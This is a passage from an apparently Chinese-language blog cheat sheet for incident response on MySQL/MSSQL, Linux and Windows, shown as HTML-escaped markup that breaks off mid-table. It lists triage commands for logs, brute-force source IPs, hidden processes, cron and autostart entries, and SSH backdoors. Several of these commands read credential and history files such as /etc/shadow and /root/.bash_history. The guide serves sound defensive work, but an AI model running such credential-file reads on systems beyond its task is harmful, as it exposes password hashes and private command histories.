class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;小总结&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1. mysql\lib\plugin目录的异常文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2. select * from mysql.func的异常&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3. mssql检查xp_cmdshell等存储过程&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4. 异常数据库登录&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5. 数据库用户弱口令&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6. mysql相关命令&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show global variables like &amp;#x27;%log%&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show global variables like &amp;#x27;%gene%&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show master status;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;systemmore /mydata/data/stu18_slow.log;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;showbinary logs;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;showmaster logs;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;showbinlog events in &amp;#x27;mysql-bin.000011&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show processlist;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;linux应急响应&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#linux应急响应&#34;&gt;#&lt;/a&gt; Linux 应急响应&lt;/h2&gt;
&lt;h4 id=&#34;文件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#文件&#34;&gt;#&lt;/a&gt; 文件&lt;/h4&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Linux 命令&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;ls -alt&lt;/td&gt;
&lt;td&gt;按时间排序以长字符串的形式显示所有文件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;find / -ctime 2&lt;/td&gt;
&lt;td&gt;查找 72 小时内新增的文件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;find ./ -mtime 0 -name “*.jsp”&lt;/td&gt;
&lt;td&gt;查找 24 小时内被修改的 JSP 文件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ls -al /tmp |grep “Feb 27”&lt;/td&gt;
&lt;td&gt;根据确定时间去反推变更的文件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;find / *.jsp -perm 4777&lt;/td&gt;
&lt;td&gt;查找 777 的权限的文件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;strings /usr/bin/.sshd |egrep ‘&lt;span 1,3=&#34;&#34;&gt;1-9&lt;/span&gt;.&lt;span 1,3=&#34;&#34;&gt;1-9&lt;/span&gt;.’&lt;/td&gt;
&lt;td&gt;分析 sshd 文件是否包括 IP 信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;find /etc/ /usr/bin/ /usr/sbin/ /bin/ /usr/local/bin/ -type f -mtime 0&lt;/td&gt;
&lt;td&gt;更改的信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;find /tmp -iname “*” -atime 1 -type f&lt;/td&gt;
&lt;td&gt;访问的信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;/var/run/utmp 有关当前登录用户的信息记录&lt;br/&gt;~/.ssh&lt;br/&gt;/etc/passwd 用户列表&lt;/td&gt;
&lt;td&gt;文件日期、新增文件、可疑 / 异常文件、最近使用文件、浏览器下载文件&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&#34;日志&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#日志&#34;&gt;#&lt;/a&gt; 日志&lt;/h4&gt;
&lt;p&gt;这里附上一张图片&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210505103536118.png&#34; alt=&#34;image-20210505103536118&#34;&gt;&lt;/p&gt;
&lt;p&gt;补充&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;/var/log/wtmp 登录进入，退出，数据交换、关机和重启纪录，即last&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/var/log/lastlog 文件记录用户最后登录的信息，即lastlog&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/var/log/secure 记录登入系统存取数据的文件，如 pop3/ssh/telnet/ftp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/var/log/cron 与定时任务相关的日志信息，记录crontab命令是否被正确的执行&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/var/log/message 系统启动后的信息和错误日志,包括整体系统信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/var/log/apache2/access.log apache有关权限日志&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/var/log/auth.log 包含系统授权信息，包括用户登录和使用的权限机制等&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/var/log/userlog 记录所有等级用户信息的日志&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/var/log/xferlog(vsftpd.log)记录Linux FTP日志&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/var/log/secure 记录大多数应用输入的账号与密码，登录成功与否&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/var/log/faillog 记录登录系统不成功的账号信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;扩展（历史记录）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;history (cat /root/.bash_history)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mysql-history (cat /root/.mysql_history)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;利用正则表达式筛选条件&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;正则表达式筛选条件&lt;/th&gt;
&lt;th&gt;效果&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;grep ‘Failed’ /var/log/secure |awk ‘{print $11}’ |sort |uniq -c |sort -nr&lt;/td&gt;
&lt;td&gt;查看爆破失败的 IP&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;grep ‘Accepted’ /var/log/secure |awk ‘{print $11}’ |sort |uniq -c |sort -nr&lt;/td&gt;
&lt;td&gt;查看登录成功的 IP&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;grep “Failed password for root” /var/log/auth.log |awk ‘{print $11}’ |sort |uniq -c |sort -nr |more&lt;/td&gt;
&lt;td&gt;定位有多少 IP 在爆破主机的 root 帐号&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;grep &amp;quot;Accepted &amp;quot; /var/log/auth.log |awk ‘{print $11}’ |sort |uniq -c |sort -nr |more&lt;/td&gt;
&lt;td&gt;登录成功的 IP&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;tail -400f demo.log&lt;/td&gt;
&lt;td&gt;监控最后 400 行日志文件的变化 等价与 tail -n 400 -f （-f 参数是实时）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;uniq -c demo.log&lt;/td&gt;
&lt;td&gt;标记该行重复的数量，不重复值为 1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;grep -c ‘ERROR’ demo.log&lt;br/&gt;cat /var/log/secure |grep &#39;Accepted password‘&lt;/td&gt;
&lt;td&gt;输出文件 demo.log 中查找所有包行 ERROR 的行的数量&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;grep &amp;quot;Accepted &amp;quot; /var/log/secure* |awk ‘{print $1,$2,$3,$9,$11}’&lt;/td&gt;
&lt;td&gt;查看登录成功的日期、用户名及 IP&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;grep “refused” /var/log/secure* |awk {‘print $9’} |sort |uniq -c |sort -nr |more （开启 iptables 的情况）&lt;br/&gt;grep “Failed password” /var/log/secure* |grep -E -o “((&lt;span 1,3=&#34;&#34;&gt;0-9&lt;/span&gt;).(&lt;span 1,3=&#34;&#34;&gt;0-9&lt;/span&gt;).(&lt;span 1,3=&#34;&#34;&gt;0-9&lt;/span&gt;).(&lt;span 1,3=&#34;&#34;&gt;0-9&lt;/span&gt;))” |uniq -c (没开启防火墙的情况)&lt;/td&gt;
&lt;td&gt;查看试图爆破主机的 IP&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;grep “Failed password for root” /var/log/secure |awk ‘{print $11}’ |sort&lt;/td&gt;
&lt;td&gt;查看爆破主机的 ROOT 账号的 IP&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;grep “Failed password” /var/log/secure |awk {‘print $9’} |sort |uniq -c |sort -nr&lt;/td&gt;
&lt;td&gt;查看爆破用户名字典&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td print=&#34;&#34; $1,$2,$3,$9,$11=&#34;&#34;&gt;grep -o “Failed password” /var/log/secure|uniq -c&lt;br/&gt;grep &amp;quot;Accepted &amp;quot; /var/log/secure |awk ’&lt;/td&gt;
&lt;td&gt;查看爆破用户名字典&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&#34;用户&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#用户&#34;&gt;#&lt;/a&gt; 用户&lt;/h4&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Linux 命令&lt;/th&gt;
&lt;th&gt;效果&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;last&lt;/td&gt;
&lt;td&gt;显示用户最近登录信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;cat /etc/shadow&lt;/td&gt;
&lt;td&gt;查看密码登陆相关信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;uptime&lt;/td&gt;
&lt;td&gt;查看用户登陆时间&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;/etc/sudoers&lt;/td&gt;
&lt;td&gt;sudo 用户列表&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;awk -F: ‘($3==0){print$1}’ /etc/passwd&lt;/td&gt;
&lt;td&gt;查看 UID 为 0 的帐号&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;awk -F: ‘($2==&amp;quot;&amp;quot;){print$1}’ /etc/shadow&lt;/td&gt;
&lt;td&gt;查看密码为空的账号&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;cat /etc/passwd |grep -E “/bin/bash$”&lt;/td&gt;
&lt;td&gt;查看能够登录的帐号&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;lastlog&lt;/td&gt;
&lt;td&gt;系统中所有用户最近一次登录信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;lastb&lt;/td&gt;
&lt;td&gt;用户错误的登录列表&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;more /etc/sudoers |grep -v “&lt;sup&gt;#|&lt;/sup&gt;$” |grep “ALL=(ALL)”&lt;/td&gt;
&lt;td&gt;查看 sudo 权限的用户&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;who&lt;/td&gt;
&lt;td&gt;查询 utmp 文件并报告当前登录的每个用户&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;w&lt;/td&gt;
&lt;td&gt;查询 utmp 文件并显示当前系统中每个用户和它所运行的进程信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;users&lt;/td&gt;
&lt;td&gt;打印当前登录的用户，每个用户名对应一个登录会话。如果一个用户不止一个登录会话，其用户名显示相同次数&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&#34;进程&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#进程&#34;&gt;#&lt;/a&gt; 进程&lt;/h4&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;进程命令&lt;/th&gt;
&lt;th&gt;效果&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;lsof&lt;/td&gt;
&lt;td&gt;列出当前系统打开文件的工具&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ps aux |grep pid |grep –v grep&lt;/td&gt;
&lt;td&gt;查看对应的进程信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;lsof -i:1677&lt;/td&gt;
&lt;td&gt;查看指定端口对应的程序&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;lsof -p 1234&lt;/td&gt;
&lt;td&gt;检查 pid 号为 1234 进程调用情况&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;strace -f -p 1234&lt;/td&gt;
&lt;td&gt;跟踪分析 pid 号为 1234 的进程&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;lsof -g gid&lt;/td&gt;
&lt;td&gt;找恶意文件关联的 lib 文件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ps -ef&lt;/td&gt;
&lt;td&gt;查看全格式的全部进程&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;pstree -a&lt;/td&gt;
&lt;td&gt;以树状图的方式展现进程之间的派生关系&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ps -ef |awk ‘{print}’ |sort -n |uniq &amp;gt;1&lt;br/&gt;ls /proc |sort -n |uniq &amp;gt;2&lt;/td&gt;
&lt;td&gt;隐藏进程查看&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;diff 1 2&lt;/td&gt;
&lt;td&gt;比较文本文件的异同处&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;netstat -anptl&lt;/td&gt;
&lt;td&gt;显示网络状态，端口信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;top&lt;/td&gt;
&lt;td&gt;实时显示系统中各个进程的资源占用状况&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&#34;自启动&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#自启动&#34;&gt;#&lt;/a&gt; 自启动&lt;/h4&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;启动配置文件&lt;/th&gt;
&lt;th&gt;特征&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;~/.bashrc&lt;/td&gt;
&lt;td&gt;用户 HOME 家目录启动文件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;/etc/rc.local&lt;/td&gt;
&lt;td&gt;开机启动程序&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;/etc/init.d/ 服务&lt;/td&gt;
&lt;td&gt;服务启动关闭&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;/etc/cron*&lt;/td&gt;
&lt;td&gt;定时任务&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;chkconfig --list |grep “3:on|5:on”&lt;/td&gt;
&lt;td&gt;查看开机自启动服务&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&#34;计划任务&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#计划任务&#34;&gt;#&lt;/a&gt; 计划任务&lt;/h4&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;查看计划任务命令&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;crontab -l &amp;amp; cat /etc/crontab &amp;amp; ls /etc/cron.* 查看计划任务&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;crontab -e  进行修改计划任务&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;crontab -u root -l  显示 root 用户计划任务&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;配置文件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;/var/spool/cron/*    root 用户执行的就会在 /var/spool/cron/ 下面创建 root 文件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;/etc/cron.d    cron 任务可以根据调度来执行&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;/etc/cron.daily/     每日计划 *&lt;br/&gt;/etc/cron.hourly/   小时计划 *&lt;br/&gt;/etc/cron.monthly/  月计划 *&lt;br/&gt;/etc/cron.weekly/   周计划&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;/etc/anacrontab   Anacrontab 的配置入口&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;/var/log/cron*   日志计划程序&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;misc 杂&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stat 命令查看文件或文件系统的状态时间等属性&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo $PATH 查看环境变量&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/rpm -Va &amp;gt; rpm.log 校验所有的RPM软件包，查找丢失的文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;kill -9 强制杀死进程&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chattr –i 取消锁定文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;setfacl / getfacl  ACL权限设置&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chmod 000 去执行权限&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;strings /usr/bin/.sshd | egrep &amp;#x27;[1-9]&amp;#123;1,3&amp;#125;.[1-9]&amp;#123;1,3&amp;#125;.&amp;#x27; ssh后门快速判断&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;windows取证&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#windows取证&#34;&gt;#&lt;/a&gt; Windows 取证&lt;/h2&gt;
&lt;p&gt;思维导图&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210505135434533.png&#34; alt=&#34;image-20210505135434533&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;文件-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#文件-2&#34;&gt;#&lt;/a&gt; 文件&lt;/h4&gt;
&lt;p&gt;分析文件路径&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;文件路径&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;C:\Documents and Settings\Administrator\Recent&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;C:\Documents and Settings\Default User\Recent&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;%UserProfile%\Recent  文件日期、新增文件、可疑/异常文件、最近使用文件、浏览器下载文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;下载目录&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;回收站文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;程序临时文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;历史文件记录&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;应用程序打开历史&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;搜索历史&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;快捷方式（LNK）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;c:\windows\temp\&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Window 2003 C:\Documents and Settings&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Window 2008R2 C:\Users\&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;时间排序文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;findstr /s /m /I “UploadFiles” *.log  查看指定时间范围包括上传文件夹的访问请求&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;findstr /s /m /I “x.js” *.asp 关键信息是x.js&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;日志-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#日志-2&#34;&gt;#&lt;/a&gt; 日志&lt;/h4&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;日志类型&lt;/th&gt;
&lt;th&gt;命令&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;系统日志，程序日志，安全日志&lt;/td&gt;
&lt;td&gt;eventvwr.msc&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;服务器日志&lt;/td&gt;
&lt;td&gt;FTP 连接日志和 HTTPD 事务日志：% systemroot% \system32\LogFiles\ &lt;br/&gt;IIS 日志默认存放在 System32\LogFiles 目录下，使用 W3C 扩展格式&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;操作系统日志&lt;/td&gt;
&lt;td&gt;登录成功的所有事件：&lt;br/&gt;LogParser.exe -i:EVT –o:DATAGRID “SELECT * FROM c:\Security.evtx where EventID=4624″&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;指定登录时间范围的事件：&lt;/td&gt;
&lt;td&gt;LogParser.exe -i:EVT –o:DATAGRID “SELECT * FROM c:\Security.evtx where TimeGenerated&amp;gt;’2018-&lt;br/&gt;06-19 23:32:11′ and TimeGenerated&amp;lt;’2018-06-20 23:34:00′ and EventID=4624″&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;提取登录成功的用户名和 IP&lt;/td&gt;
